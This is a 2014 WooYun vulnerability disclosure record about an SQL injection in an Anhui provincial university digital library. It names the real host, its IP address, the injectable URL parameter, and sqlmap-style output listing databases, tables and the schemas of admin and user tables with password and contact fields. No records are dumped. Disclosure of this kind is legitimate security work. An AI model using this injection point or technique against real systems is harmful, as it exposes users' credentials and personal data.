{"id": 42771, "wybug_id": "wooyun-2014-084692", "wybug_title": "某省数字图书馆SQL注入泄漏敏感信息", "wybug_corp": "中国科学技术大学", "wybug_author": "an0nym0u5", "wybug_date": "2014-11-26 10:15", "wybug_open_date": "2014-12-01 10:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-01：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  SQL注入 详细说明：  安徽省高等学校数字图书馆http://ahadl.org/\n\n注入点：http://202.38.93.29//asearch.do?status=showpage&LanguageType=0注入参数：LanguageType\n\n   漏洞证明：  \n\n\navailable databases [7]:[*] ahzx1222[*] master[*] model[*] msdb[*] proone[*] proonetest[*] tempdb\n测试第一个库：\nDatabase: ahzx1222[52 tables]+-------------------------+| dbo.ACCOUNT             || dbo.ACTIONDEF           || dbo.AFFICHE             || dbo.AutoSystem          || dbo.CCIPFILTER          || dbo.CLASSFIY            || dbo.CLASSSETTING        || dbo.ClearCacheLog       || dbo.Customer            || dbo.CustomerServers     || dbo.D99_CMD             || dbo.DOCCLASSIFY         || dbo.DeleteFileOrderRule || dbo.DeleteFileSelRule   || dbo.EBOOKSERVERIP       || dbo.FeedBackTb          || dbo.GOLBALSETTING       || dbo.IPAREA              || dbo.IPFILTER            || dbo.ISORES              || dbo.ISOType             || dbo.LOGMAKESRC          || dbo.LOGSEARCH           || dbo.LOGVIEWSRC          || dbo.MMSSERVER           || dbo.NewInfo             || dbo.OAIFormat           || dbo.ONLINEIP            || dbo.ONLINEUSER          || dbo.Question            || dbo.REQUESTISO          || dbo.RESOURCELIST        || dbo.RESOURCETYPE        || dbo.RESSERVER           || dbo.SEARCHFIELDS        || dbo.SEARCHINDEX         || dbo.SetMetaCDServer     || dbo.ShareServerList     || dbo.SynchrRes           || dbo.SynchroLog          || dbo.SystemSetType       || dbo.TEMPLATE            || dbo.TEMPLATEFIELDS      || dbo.TIMERREAP           || dbo.VodCommend          || dbo.WEBTEMPLATE         || dbo.books               || dbo.dcfilelds           || dbo.dtproperties        || dbo.other               || dbo.sqlmapoutput        || dbo.sysdiagrams         |+-------------------------+\ndbo.ACCOUNT很明显是管理员表：\nDatabase: ahzx1222Table: dbo.ACCOUNT[15 columns]+---------------+----------+| Column        | Type     |+---------------+----------+| ACCID         | numeric  || ACCNAME       | char     || ADDDATE       | datetime || EMAIL         | char     || isTryUser     | bit      || LASTLOGINDATE | datetime || LimitTime     | datetime || PASSWORD      | char     || QQ            | char     || ResLevel      | numeric  || SEX           | numeric  || TELEPHONE     | char     || UserDesc      | varchar  || USERLASTIP    | char     || USERTYPE      | numeric  |+---------------+----------+\n有用户账户密码、联系方式等等，点到为止不列举。还有一个表是dbo.Customer，这是普通用户表：\nDatabase: ahzx1222Table: dbo.Customer[15 columns]+------------------+----------+| Column           | Type     |+------------------+----------+| AddTime          | datetime || AutoSysID        | int      || CustomerID       | int      || CustomerName     | varchar  || CustomerPassword | varchar  || ISEnable         | int      || LimitTime        | varchar  || RelationEmail    | varchar  || RelationName     | varchar  || RelationTel      | varchar  || SchoolCode       | varchar  || SchoolName       | varchar  || ServerIP         | varchar  || SIDs             | varchar  || WebIP            | varchar  |\n看到了CustomerName、CustomerPassword、RelationTel等敏感字段，这里不列出信息。只证明漏洞存在及其危害性。其他库和表同样可以获得相应数据。   修复方案：  参数严格过滤。   版权声明：转载请注明来源 an0nym0u5@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-01 10:16 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}